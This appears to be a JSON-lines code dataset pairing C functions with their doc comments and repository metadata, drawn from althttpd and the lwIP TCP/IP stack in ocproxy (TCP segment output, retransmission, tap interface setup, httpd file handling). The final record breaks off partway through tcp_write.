{"docstring": "/*\n** Make a copy of a string into memory obtained from malloc.\n*/\n", "func_signal": "static char *StrDup(const char *zSrc)", "code": "{\n  char *zDest;\n  size_t size;\n\n  if( zSrc==0 ) return 0;\n  size = strlen(zSrc) + 1;\n  zDest = (char*)SafeMalloc( size );\n  strcpy(zDest,zSrc);\n  return zDest;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Test procedure for ParseRfc822Date\n*/\n", "func_signal": "void TestParseRfc822Date(void)", "code": "{\n  time_t t1, t2;\n  for(t1=0; t1<0x7fffffff; t1 += 127){\n    t2 = ParseRfc822Date(Rfc822Date(t1));\n    assert( t1==t2 );\n  }\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * mintapif_input():\n *\n * This function should be called when a packet is ready to be read\n * from the interface. It uses the function low_level_input() that\n * should handle the actual reception of bytes from the network\n * interface.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\nmintapif_input(struct netif *netif)", "code": "{\n  struct pbuf *p;\n\n  p = low_level_input(netif);\n  if (p != NULL) {\n#if LINK_STATS\n    lwip_stats.link.recv++;\n#endif /* LINK_STATS */\n\n    netif->input(p, netif);\n  }\n}", "path": "contrib\\ports\\unix\\proj\\minimal\\mintapif.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Find out what we can send and send it\n *\n * @param pcb Protocol control block for the TCP connection to send data\n * @return ERR_OK if data has been sent or nothing to send\n *         another err_t on error\n */\n", "func_signal": "err_t\ntcp_output(struct tcp_pcb *pcb)", "code": "{\n  struct tcp_seg *seg, *useg;\n  u32_t wnd, snd_nxt;\n#if TCP_CWND_DEBUG\n  s16_t i = 0;\n#endif /* TCP_CWND_DEBUG */\n\n  /* pcb->state LISTEN not allowed here */\n  LWIP_ASSERT(\"don't call tcp_output for listen-pcbs\",\n    pcb->state != LISTEN);\n\n  /* First, check if we are invoked by the TCP input processing\n     code. If so, we do not output anything. Instead, we rely on the\n     input processing code to call us when input processing is done\n     with. */\n  if (tcp_input_pcb == pcb) {\n    return ERR_OK;\n  }\n\n  wnd = LWIP_MIN(pcb->snd_wnd, pcb->cwnd);\n\n  seg = pcb->unsent;\n\n  /* If the TF_ACK_NOW flag is set and no data will be sent (either\n   * because the ->unsent queue is empty or because the window does\n   * not allow it), construct an empty ACK segment and send it.\n   *\n   * If data is to be sent, we will just piggyback the ACK (see below).\n   */\n  if (pcb->flags & TF_ACK_NOW &&\n     (seg == NULL ||\n      ntohl(seg->tcphdr->seqno) - pcb->lastack + seg->len > wnd)) {\n     return tcp_send_empty_ack(pcb);\n  }\n\n  /* useg should point to last segment on unacked queue */\n  useg = pcb->unacked;\n  if (useg != NULL) {\n    for (; useg->next != NULL; useg = useg->next);\n  }\n\n#if TCP_OUTPUT_DEBUG\n  if (seg == NULL) {\n    LWIP_DEBUGF(TCP_OUTPUT_DEBUG, (\"tcp_output: nothing to send (%p)\\n\",\n                                   (void*)pcb->unsent));\n  }\n#endif /* TCP_OUTPUT_DEBUG */\n#if TCP_CWND_DEBUG\n  if (seg == NULL) {\n    LWIP_DEBUGF(TCP_CWND_DEBUG, (\"tcp_output: snd_wnd %\"TCPWNDSIZE_F\n                                 \", cwnd %\"TCPWNDSIZE_F\", wnd %\"U32_F\n                                 \", seg == NULL, ack %\"U32_F\"\\n\",\n                                 pcb->snd_wnd, pcb->cwnd, wnd, pcb->lastack));\n  } else {\n    LWIP_DEBUGF(TCP_CWND_DEBUG, \n                (\"tcp_output: snd_wnd %\"TCPWNDSIZE_F\", cwnd %\"TCPWNDSIZE_F\", wnd %\"U32_F\n                 \", effwnd %\"U32_F\", seq %\"U32_F\", ack %\"U32_F\"\\n\",\n                 pcb->snd_wnd, pcb->cwnd, wnd,\n                 ntohl(seg->tcphdr->seqno) - pcb->lastack + seg->len,\n                 ntohl(seg->tcphdr->seqno), pcb->lastack));\n  }\n#endif /* TCP_CWND_DEBUG */\n  /* data available and window allows it to be sent? */\n  while (seg != NULL &&\n         ntohl(seg->tcphdr->seqno) - pcb->lastack + seg->len <= wnd) {\n    LWIP_ASSERT(\"RST not expected here!\", \n                (TCPH_FLAGS(seg->tcphdr) & TCP_RST) == 0);\n    /* Stop sending if the nagle algorithm would prevent it\n     * Don't stop:\n     * - if tcp_write had a memory error before (prevent delayed ACK timeout) or\n     * - if FIN was already enqueued for this PCB (SYN is always alone in a segment -\n     *   either seg->next != NULL or pcb->unacked == NULL;\n     *   RST is no sent using tcp_write/tcp_output.\n     */\n    if((tcp_do_output_nagle(pcb) == 0) &&\n      ((pcb->flags & (TF_NAGLEMEMERR | TF_FIN)) == 0)){\n      break;\n    }\n#if TCP_CWND_DEBUG\n    LWIP_DEBUGF(TCP_CWND_DEBUG, (\"tcp_output: snd_wnd %\"TCPWNDSIZE_F\", cwnd %\"TCPWNDSIZE_F\", wnd %\"U32_F\", effwnd %\"U32_F\", seq %\"U32_F\", ack %\"U32_F\", i %\"S16_F\"\\n\",\n                            pcb->snd_wnd, pcb->cwnd, wnd,\n                            ntohl(seg->tcphdr->seqno) + seg->len -\n                            pcb->lastack,\n                            ntohl(seg->tcphdr->seqno), pcb->lastack, i));\n    ++i;\n#endif /* TCP_CWND_DEBUG */\n\n    pcb->unsent = seg->next;\n\n    if (pcb->state != SYN_SENT) {\n      TCPH_SET_FLAG(seg->tcphdr, TCP_ACK);\n      pcb->flags &= ~(TF_ACK_DELAY | TF_ACK_NOW);\n    }\n\n#if TCP_OVERSIZE_DBGCHECK\n    seg->oversize_left = 0;\n#endif /* TCP_OVERSIZE_DBGCHECK */\n    tcp_output_segment(seg, pcb);\n    snd_nxt = ntohl(seg->tcphdr->seqno) + TCP_TCPLEN(seg);\n    if (TCP_SEQ_LT(pcb->snd_nxt, snd_nxt)) {\n      pcb->snd_nxt = snd_nxt;\n    }\n    /* put segment on unacknowledged list if length > 0 */\n    if (TCP_TCPLEN(seg) > 0) {\n      seg->next = NULL;\n      /* unacked list is empty? */\n      if (pcb->unacked == NULL) {\n        pcb->unacked = seg;\n        useg = seg;\n      /* unacked list is not empty? */\n      } else {\n        /* In the case of fast retransmit, the packet should not go to the tail\n         * of the unacked queue, but rather somewhere before it. We need to check for\n         * this case. -STJ Jul 27, 2004 */\n        if (TCP_SEQ_LT(ntohl(seg->tcphdr->seqno), ntohl(useg->tcphdr->seqno))) {\n          /* add segment to before tail of unacked list, keeping the list sorted */\n          struct tcp_seg **cur_seg = &(pcb->unacked);\n          while (*cur_seg &&\n            TCP_SEQ_LT(ntohl((*cur_seg)->tcphdr->seqno), ntohl(seg->tcphdr->seqno))) {\n              cur_seg = &((*cur_seg)->next );\n          }\n          seg->next = (*cur_seg);\n          (*cur_seg) = seg;\n        } else {\n          /* add segment to tail of unacked list */\n          useg->next = seg;\n          useg = useg->next;\n        }\n      }\n    /* do not queue empty segments on the unacked list */\n    } else {\n      tcp_seg_free(seg);\n    }\n    seg = pcb->unsent;\n  }\n#if TCP_OVERSIZE\n  if (pcb->unsent == NULL) {\n    /* last unsent has been removed, reset unsent_oversize */\n    pcb->unsent_oversize = 0;\n  }\n#endif /* TCP_OVERSIZE */\n\n  pcb->flags &= ~TF_NAGLEMEMERR;\n  return ERR_OK;\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nfs_close(struct fs_file *file)", "code": "{\n#if LWIP_HTTPD_CUSTOM_FILES\n  if (file->is_custom_file) {\n    fs_close_custom(file);\n  }\n#endif /* LWIP_HTTPD_CUSTOM_FILES */\n#if LWIP_HTTPD_FILE_STATE\n  fs_state_free(file, file->state);\n#endif /* #if LWIP_HTTPD_FILE_STATE */\n  LWIP_UNUSED_ARG(file);\n}", "path": "contrib\\apps\\httpserver_raw\\fs.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * low_level_output():\n *\n * Should do the actual transmission of the packet. The packet is\n * contained in the pbuf that is passed to the function. This pbuf\n * might be chained.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static err_t\nlow_level_output(struct netif *netif, struct pbuf *p)", "code": "{\n  struct mintapif *mintapif;\n  struct pbuf *q;\n  char buf[1514];\n  char *bufptr;\n  int written;\n\n  mintapif = (struct mintapif *)netif->state;\n  \n  /* initiate transfer(); */\n  \n  bufptr = &buf[0];\n  \n  for(q = p; q != NULL; q = q->next) {\n    /* Send the data from the pbuf to the interface, one pbuf at a\n       time. The size of the data in each pbuf is kept in the ->len\n       variable. */    \n    /* send data from(q->payload, q->len); */\n    memcpy(bufptr, q->payload, q->len);\n    bufptr += q->len;\n  }\n\n  /* signal that packet should be sent(); */\n  written = write(mintapif->fd, buf, p->tot_len);\n  if (written == -1) {\n    snmp_inc_ifoutdiscards(netif);\n    perror(\"tapif: write\");\n  }\n  else {\n    snmp_add_ifoutoctets(netif, written);\n  }\n  return ERR_OK;\n}", "path": "contrib\\ports\\unix\\proj\\minimal\\mintapif.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Create a TCP segment with prefilled header.\n *\n * Called by tcp_write and tcp_enqueue_flags.\n *\n * @param pcb Protocol control block for the TCP connection.\n * @param p pbuf that is used to hold the TCP header.\n * @param flags TCP flags for header.\n * @param seqno TCP sequence number of this packet\n * @param optflags options to include in TCP header\n * @return a new tcp_seg pointing to p, or NULL.\n * The TCP header is filled in except ackno and wnd.\n * p is freed on failure.\n */\n", "func_signal": "static struct tcp_seg *\ntcp_create_segment(struct tcp_pcb *pcb, struct pbuf *p, u8_t flags, u32_t seqno, u8_t optflags)", "code": "{\n  struct tcp_seg *seg;\n  u8_t optlen = LWIP_TCP_OPT_LENGTH(optflags);\n\n  if ((seg = (struct tcp_seg *)memp_malloc(MEMP_TCP_SEG)) == NULL) {\n    LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2, (\"tcp_create_segment: no memory.\\n\"));\n    pbuf_free(p);\n    return NULL;\n  }\n  seg->flags = optflags;\n  seg->next = NULL;\n  seg->p = p;\n  LWIP_ASSERT(\"p->tot_len >= optlen\", p->tot_len >= optlen);\n  seg->len = p->tot_len - optlen;\n#if TCP_OVERSIZE_DBGCHECK\n  seg->oversize_left = 0;\n#endif /* TCP_OVERSIZE_DBGCHECK */\n#if TCP_CHECKSUM_ON_COPY\n  seg->chksum = 0;\n  seg->chksum_swapped = 0;\n  /* check optflags */\n  LWIP_ASSERT(\"invalid optflags passed: TF_SEG_DATA_CHECKSUMMED\",\n              (optflags & TF_SEG_DATA_CHECKSUMMED) == 0);\n#endif /* TCP_CHECKSUM_ON_COPY */\n\n  /* build TCP header */\n  if (pbuf_header(p, TCP_HLEN)) {\n    LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2, (\"tcp_create_segment: no room for TCP header in pbuf.\\n\"));\n    TCP_STATS_INC(tcp.err);\n    tcp_seg_free(seg);\n    return NULL;\n  }\n  seg->tcphdr = (struct tcp_hdr *)seg->p->payload;\n  seg->tcphdr->src = htons(pcb->local_port);\n  seg->tcphdr->dest = htons(pcb->remote_port);\n  seg->tcphdr->seqno = htonl(seqno);\n  /* ackno is set in tcp_output */\n  TCPH_HDRLEN_FLAGS_SET(seg->tcphdr, (5 + optlen / 4), flags);\n  /* wnd and chksum are set in tcp_output */\n  seg->tcphdr->urgp = 0;\n  return seg;\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\nlow_level_init(struct netif *netif)", "code": "{\n  struct mintapif *mintapif;\n  char buf[1024];\n  int ret;\n\n  mintapif = (struct mintapif *)netif->state;\n  \n  /* Obtain MAC address from network interface. */\n  mintapif->ethaddr->addr[0] = 1;\n  mintapif->ethaddr->addr[1] = 2;\n  mintapif->ethaddr->addr[2] = 3;\n  mintapif->ethaddr->addr[3] = 4;\n  mintapif->ethaddr->addr[4] = 5;\n  mintapif->ethaddr->addr[5] = 6;\n\n  /* device capabilities */\n  /* don't set NETIF_FLAG_ETHARP if this device is not an ethernet one */\n  netif->flags |= NETIF_FLAG_BROADCAST | NETIF_FLAG_ETHARP;\n\n  /* Do whatever else is needed to initialize interface. */  \n  \n  mintapif->fd = open(DEVTAP, O_RDWR);\n  if (mintapif->fd == -1) {\n    perror(\"tapif: tapif_init: open\");\n    exit(1);\n  }\n\n#ifdef linux\n  {\n    struct ifreq ifr;\n    memset(&ifr, 0, sizeof(ifr));\n    ifr.ifr_flags = IFF_TAP|IFF_NO_PI;\n    if (ioctl(mintapif->fd, TUNSETIFF, (void *) &ifr) < 0) {\n      perror(buf);\n      exit(1);\n    }\n  }\n#endif /* Linux */\n\n  snprintf(buf, sizeof(buf), \"/sbin/ifconfig \" IFCONFIG_ARGS,\n           ip4_addr1(&(netif->gw)),\n           ip4_addr2(&(netif->gw)),\n           ip4_addr3(&(netif->gw)),\n           ip4_addr4(&(netif->gw)));\n  \n  ret = system(buf);\n  if (ret < 0) {\n    perror(\"ifconfig failed\");\n    exit(1);\n  }\n  if (ret != 0) {\n    printf(\"ifconfig returned %d\\n\", ret);\n  }\n\n  mintapif->lasttime = 0;\n\n}", "path": "contrib\\ports\\unix\\proj\\minimal\\mintapif.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * mintapif_init():\n *\n * Should be called at the beginning of the program to set up the\n * network interface. It calls the function low_level_init() to do the\n * actual setup of the hardware.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "err_t\nmintapif_init(struct netif *netif)", "code": "{\n  struct mintapif *mintapif;\n    \n  mintapif = (struct mintapif *)mem_malloc(sizeof(struct mintapif));\n  if (mintapif == NULL)\n  {\n    LWIP_DEBUGF(NETIF_DEBUG, (\"cs8900_init: out of memory for mintapif\\n\"));\n    return ERR_MEM;\n  }\n  netif->state = mintapif;\n#if LWIP_SNMP\n  /* ifType is other(1), there doesn't seem\n     to be a proper type for the tunnel if */\n  netif->link_type = 1;\n  /* @todo get this from struct tunif? */\n  netif->link_speed = 0;\n  netif->ts = 0;\n  netif->ifinoctets = 0;\n  netif->ifinucastpkts = 0;\n  netif->ifinnucastpkts = 0;\n  netif->ifindiscards = 0;\n  netif->ifoutoctets = 0;\n  netif->ifoutucastpkts = 0;\n  netif->ifoutnucastpkts = 0;\n  netif->ifoutdiscards = 0;\n#endif\n\n  netif->hwaddr_len = 6;\n  netif->name[0] = IFNAME0;\n  netif->name[1] = IFNAME1;\n  netif->output = etharp_output;\n  netif->linkoutput = low_level_output;\n  netif->mtu = 1500;\n  \n  mintapif->ethaddr = (struct eth_addr *)&(netif->hwaddr[0]);\n  \n  low_level_init(netif);\n\n  return ERR_OK;\n}", "path": "contrib\\ports\\unix\\proj\\minimal\\mintapif.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Requeue the first unacked segment for retransmission\n *\n * Called by tcp_receive() for fast retramsmit.\n *\n * @param pcb the tcp_pcb for which to retransmit the first unacked segment\n */\n", "func_signal": "void\ntcp_rexmit(struct tcp_pcb *pcb)", "code": "{\n  struct tcp_seg *seg;\n  struct tcp_seg **cur_seg;\n\n  if (pcb->unacked == NULL) {\n    return;\n  }\n\n  /* Move the first unacked segment to the unsent queue */\n  /* Keep the unsent queue sorted. */\n  seg = pcb->unacked;\n  pcb->unacked = seg->next;\n\n  cur_seg = &(pcb->unsent);\n  while (*cur_seg &&\n    TCP_SEQ_LT(ntohl((*cur_seg)->tcphdr->seqno), ntohl(seg->tcphdr->seqno))) {\n      cur_seg = &((*cur_seg)->next );\n  }\n  seg->next = *cur_seg;\n  *cur_seg = seg;\n#if TCP_OVERSIZE\n  if (seg->next == NULL) {\n    /* the retransmitted segment is last in unsent, so reset unsent_oversize */\n    pcb->unsent_oversize = 0;\n  }\n#endif /* TCP_OVERSIZE */\n\n  ++pcb->nrtx;\n\n  /* Don't take any rtt measurements after retransmitting. */\n  pcb->rttest = 0;\n\n  /* Do the actual retransmission. */\n  snmp_inc_tcpretranssegs();\n  /* No need to call tcp_output: we are always called from tcp_input()\n     and thus tcp_output directly returns. */\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Send persist timer zero-window probes to keep a connection active\n * when a window update is lost.\n *\n * Called by tcp_slowtmr()\n *\n * @param pcb the tcp_pcb for which to send a zero-window probe packet\n */\n", "func_signal": "void\ntcp_zero_window_probe(struct tcp_pcb *pcb)", "code": "{\n  struct pbuf *p;\n  struct tcp_hdr *tcphdr;\n  struct tcp_seg *seg;\n  u16_t len;\n  u8_t is_fin;\n\n  LWIP_DEBUGF(TCP_DEBUG, (\"tcp_zero_window_probe: sending ZERO WINDOW probe to \"));\n  ipX_addr_debug_print(PCB_ISIPV6(pcb), TCP_DEBUG, &pcb->remote_ip);\n  LWIP_DEBUGF(TCP_DEBUG, (\"\\n\"));\n\n  LWIP_DEBUGF(TCP_DEBUG, \n              (\"tcp_zero_window_probe: tcp_ticks %\"U32_F\n               \"   pcb->tmr %\"U32_F\" pcb->keep_cnt_sent %\"U16_F\"\\n\", \n               tcp_ticks, pcb->tmr, pcb->keep_cnt_sent));\n\n  seg = pcb->unacked;\n\n  if(seg == NULL) {\n    seg = pcb->unsent;\n  }\n  if(seg == NULL) {\n    return;\n  }\n\n  is_fin = ((TCPH_FLAGS(seg->tcphdr) & TCP_FIN) != 0) && (seg->len == 0);\n  /* we want to send one seqno: either FIN or data (no options) */\n  len = is_fin ? 0 : 1;\n\n  p = tcp_output_alloc_header(pcb, 0, len, seg->tcphdr->seqno);\n  if(p == NULL) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"tcp_zero_window_probe: no memory for pbuf\\n\"));\n    return;\n  }\n  tcphdr = (struct tcp_hdr *)p->payload;\n\n  if (is_fin) {\n    /* FIN segment, no data */\n    TCPH_FLAGS_SET(tcphdr, TCP_ACK | TCP_FIN);\n  } else {\n    /* Data segment, copy in one byte from the head of the unacked queue */\n    char *d = ((char *)p->payload + TCP_HLEN);\n    /* Depending on whether the segment has already been sent (unacked) or not\n       (unsent), seg->p->payload points to the IP header or TCP header.\n       Ensure we copy the first TCP data byte: */\n    pbuf_copy_partial(seg->p, d, 1, seg->p->tot_len - seg->len);\n  }\n\n#if CHECKSUM_GEN_TCP\n  tcphdr->chksum = ipX_chksum_pseudo(PCB_ISIPV6(pcb), p, IP_PROTO_TCP, p->tot_len,\n      &pcb->local_ip, &pcb->remote_ip);\n#endif\n  TCP_STATS_INC(tcp.xmit);\n\n  /* Send output to IP */\n#if LWIP_NETIF_HWADDRHINT\n  ipX_output_hinted(PCB_ISIPV6(pcb), p, &pcb->local_ip, &pcb->remote_ip, pcb->ttl,\n    0, IP_PROTO_TCP, &pcb->addr_hint);\n#else /* LWIP_NETIF_HWADDRHINT*/\n  ipX_output(PCB_ISIPV6(pcb), p, &pcb->local_ip, &pcb->remote_ip, pcb->ttl, 0, IP_PROTO_TCP);\n#endif /* LWIP_NETIF_HWADDRHINT*/\n\n  pbuf_free(p);\n\n  LWIP_DEBUGF(TCP_DEBUG, (\"tcp_zero_window_probe: seqno %\"U32_F\n                          \" ackno %\"U32_F\".\\n\",\n                          pcb->snd_nxt - 1, pcb->rcv_nxt));\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/** Checks if tcp_write is allowed or not (checks state, snd_buf and snd_queuelen).\n *\n * @param pcb the tcp pcb to check for\n * @param len length of data to send (checked agains snd_buf)\n * @return ERR_OK if tcp_write is allowed to proceed, another err_t otherwise\n */\n", "func_signal": "static err_t\ntcp_write_checks(struct tcp_pcb *pcb, u16_t len)", "code": "{\n  /* connection is in invalid state for data transmission? */\n  if ((pcb->state != ESTABLISHED) &&\n      (pcb->state != CLOSE_WAIT) &&\n      (pcb->state != SYN_SENT) &&\n      (pcb->state != SYN_RCVD)) {\n    LWIP_DEBUGF(TCP_OUTPUT_DEBUG | LWIP_DBG_STATE | LWIP_DBG_LEVEL_SEVERE, (\"tcp_write() called in invalid state\\n\"));\n    return ERR_CONN;\n  } else if (len == 0) {\n    return ERR_OK;\n  }\n\n  /* fail on too much data */\n  if (len > pcb->snd_buf) {\n    LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 3, (\"tcp_write: too much data (len=%\"U16_F\" > snd_buf=%\"U16_F\")\\n\",\n      len, pcb->snd_buf));\n    pcb->flags |= TF_NAGLEMEMERR;\n    return ERR_MEM;\n  }\n\n  LWIP_DEBUGF(TCP_QLEN_DEBUG, (\"tcp_write: queuelen: %\"TCPWNDSIZE_F\"\\n\", (tcpwnd_size_t)pcb->snd_queuelen));\n\n  /* If total number of pbufs on the unsent/unacked queues exceeds the\n   * configured maximum, return an error */\n  /* check for configured max queuelen and possible overflow */\n  if ((pcb->snd_queuelen >= TCP_SND_QUEUELEN) || (pcb->snd_queuelen > TCP_SNDQUEUELEN_OVERFLOW)) {\n    LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 3, (\"tcp_write: too long queue %\"TCPWNDSIZE_F\" (max %\"TCPWNDSIZE_F\")\\n\",\n      pcb->snd_queuelen, TCP_SND_QUEUELEN));\n    TCP_STATS_INC(tcp.memerr);\n    pcb->flags |= TF_NAGLEMEMERR;\n    return ERR_MEM;\n  }\n  if (pcb->snd_queuelen != 0) {\n    LWIP_ASSERT(\"tcp_write: pbufs on queue => at least one queue non-empty\",\n      pcb->unacked != NULL || pcb->unsent != NULL);\n  } else {\n    LWIP_ASSERT(\"tcp_write: no pbufs on queue => both queues empty\",\n      pcb->unacked == NULL && pcb->unsent == NULL);\n  }\n  return ERR_OK;\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/** Add a checksum of newly added data to the segment */\n", "func_signal": "static void\ntcp_seg_add_chksum(u16_t chksum, u16_t len, u16_t *seg_chksum,\n                   u8_t *seg_chksum_swapped)", "code": "{\n  u32_t helper;\n  /* add chksum to old chksum and fold to u16_t */\n  helper = chksum + *seg_chksum;\n  chksum = FOLD_U32T(helper);\n  if ((len & 1) != 0) {\n    *seg_chksum_swapped = 1 - *seg_chksum_swapped;\n    chksum = SWAP_BYTES_IN_WORD(chksum);\n  }\n  *seg_chksum = chksum;\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "err_t\nfs_open(struct fs_file *file, const char *name)", "code": "{\n  const struct fsdata_file *f;\n\n  if ((file == NULL) || (name == NULL)) {\n     return ERR_ARG;\n  }\n\n#if LWIP_HTTPD_CUSTOM_FILES\n  if (fs_open_custom(file, name)) {\n    file->is_custom_file = 1;\n    return ERR_OK;\n  }\n  file->is_custom_file = 0;\n#endif /* LWIP_HTTPD_CUSTOM_FILES */\n\n  for (f = FS_ROOT; f != NULL; f = f->next) {\n    if (!strcmp(name, (char *)f->name)) {\n      file->data = (const char *)f->data;\n      file->len = f->len;\n      file->index = f->len;\n      file->pextension = NULL;\n      file->http_header_included = f->http_header_included;\n#if HTTPD_PRECALCULATED_CHECKSUM\n      file->chksum_count = f->chksum_count;\n      file->chksum = f->chksum;\n#endif /* HTTPD_PRECALCULATED_CHECKSUM */\n#if LWIP_HTTPD_FILE_STATE\n      file->state = fs_state_init(file, name);\n#endif /* #if LWIP_HTTPD_FILE_STATE */\n      return ERR_OK;\n    }\n  }\n  /* file not found */\n  return ERR_VAL;\n}", "path": "contrib\\apps\\httpserver_raw\\fs.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Write data for sending (but does not send it immediately).\n *\n * It waits in the expectation of more data being sent soon (as\n * it can send them more efficiently by combining them together).\n * To prompt the system to send data now, call tcp_output() after\n * calling tcp_write().\n *\n * @param pcb Protocol control block for the TCP connection to enqueue data for.\n * @param arg Pointer to the data to be enqueued for sending.\n * @param len Data length in bytes\n * @param apiflags combination of following flags :\n * - TCP_WRITE_FLAG_COPY (0x01) data will be copied into memory belonging to the stack\n * - TCP_WRITE_FLAG_MORE (0x02) for TCP connection, PSH flag will be set on last segment sent,\n * @return ERR_OK if enqueued, another err_t on error\n */\n", "func_signal": "err_t\ntcp_write(struct tcp_pcb *pcb, const void *arg, u16_t len, u8_t apiflags)", "code": "{\n  struct pbuf *concat_p = NULL;\n  struct tcp_seg *last_unsent = NULL, *seg = NULL, *prev_seg = NULL, *queue = NULL;\n  u16_t pos = 0; /* position in 'arg' data */\n  u16_t queuelen;\n  u8_t optlen = 0;\n  u8_t optflags = 0;\n#if TCP_OVERSIZE\n  u16_t oversize = 0;\n  u16_t oversize_used = 0;\n#endif /* TCP_OVERSIZE */\n#if TCP_CHECKSUM_ON_COPY\n  u16_t concat_chksum = 0;\n  u8_t concat_chksum_swapped = 0;\n  u16_t concat_chksummed = 0;\n#endif /* TCP_CHECKSUM_ON_COPY */\n  err_t err;\n  /* don't allocate segments bigger than half the maximum window we ever received */\n  u16_t mss_local = LWIP_MIN(pcb->mss, pcb->snd_wnd_max/2);\n  mss_local = mss_local ? mss_local : pcb->mss;\n\n#if LWIP_NETIF_TX_SINGLE_PBUF\n  /* Always copy to try to create single pbufs for TX */\n  apiflags |= TCP_WRITE_FLAG_COPY;\n#endif /* LWIP_NETIF_TX_SINGLE_PBUF */\n\n  LWIP_DEBUGF(TCP_OUTPUT_DEBUG, (\"tcp_write(pcb=%p, data=%p, len=%\"U16_F\", apiflags=%\"U16_F\")\\n\",\n    (void *)pcb, arg, len, (u16_t)apiflags));\n  LWIP_ERROR(\"tcp_write: arg == NULL (programmer violates API)\", \n             arg != NULL, return ERR_ARG;);\n\n  err = tcp_write_checks(pcb, len);\n  if (err != ERR_OK) {\n    return err;\n  }\n  queuelen = pcb->snd_queuelen;\n\n#if LWIP_TCP_TIMESTAMPS\n  if ((pcb->flags & TF_TIMESTAMP)) {\n    /* Make sure the timestamp option is only included in data segments if we\n       agreed about it with the remote host. */\n    optflags = TF_SEG_OPTS_TS;\n    optlen = LWIP_TCP_OPT_LENGTH(TF_SEG_OPTS_TS);\n    /* ensure that segments can hold at least one data byte... */\n    mss_local = LWIP_MAX(mss_local, LWIP_TCP_OPT_LEN_TS + 1);\n  }\n#endif /* LWIP_TCP_TIMESTAMPS */\n\n\n  /*\n   * TCP segmentation is done in three phases with increasing complexity:\n   *\n   * 1. Copy data directly into an oversized pbuf.\n   * 2. Chain a new pbuf to the end of pcb->unsent.\n   * 3. Create new segments.\n   *\n   * We may run out of memory at any point. In that case we must\n   * return ERR_MEM and not change anything in pcb. Therefore, all\n   * changes are recorded in local variables and committed at the end\n   * of the function. Some pcb fields are maintained in local copies:\n   *\n   * queuelen = pcb->snd_queuelen\n   * oversize = pcb->unsent_oversize\n   *\n   * These variables are set consistently by the phases:\n   *\n   * seg points to the last segment tampered with.\n   *\n   * pos records progress as data is segmented.\n   */\n\n  /* Find the tail of the unsent queue. */\n  if (pcb->unsent != NULL) {\n    u16_t space;\n    u16_t unsent_optlen;\n\n    /* @todo: this could be sped up by keeping last_unsent in the pcb */\n    for (last_unsent = pcb->unsent; last_unsent->next != NULL;\n         last_unsent = last_unsent->next);\n\n    /* Usable space at the end of the last unsent segment */\n    unsent_optlen = LWIP_TCP_OPT_LENGTH(last_unsent->flags);\n    LWIP_ASSERT(\"mss_local is too small\", mss_local >= last_unsent->len + unsent_optlen);\n    space = mss_local - (last_unsent->len + unsent_optlen);\n\n    /*\n     * Phase 1: Copy data directly into an oversized pbuf.\n     *\n     * The number of bytes copied is recorded in the oversize_used\n     * variable. The actual copying is done at the bottom of the\n     * function.\n     */\n#if TCP_OVERSIZE\n#if TCP_OVERSIZE_DBGCHECK\n    /* check that pcb->unsent_oversize matches last_unsent->unsent_oversize */\n    LWIP_ASSERT(\"unsent_oversize mismatch (pcb vs. last_unsent)\",\n                pcb->unsent_oversize == last_unsent->oversize_left);\n#endif /* TCP_OVERSIZE_DBGCHECK */\n    oversize = pcb->unsent_oversize;\n    if (oversize > 0) {\n      LWIP_ASSERT(\"inconsistent oversize vs. space\", oversize_used <= space);\n      seg = last_unsent;\n      oversize_used = oversize < len ? oversize : len;\n      pos += oversize_used;\n      oversize -= oversize_used;\n      space -= oversize_used;\n    }\n    /* now we are either finished or oversize is zero */\n    LWIP_ASSERT(\"inconsistend oversize vs. len\", (oversize == 0) || (pos == len));\n#endif /* TCP_OVERSIZE */\n\n    /*\n     * Phase 2: Chain a new pbuf to the end of pcb->unsent.\n     *\n     * We don't extend segments containing SYN/FIN flags or options\n     * (len==0). The new pbuf is kept in concat_p and pbuf_cat'ed at\n     * the end.\n     */\n    if ((pos < len) && (space > 0) && (last_unsent->len > 0)) {\n      u16_t seglen = space < len - pos ? space : len - pos;\n      seg = last_unsent;\n\n      /* Create a pbuf with a copy or reference to 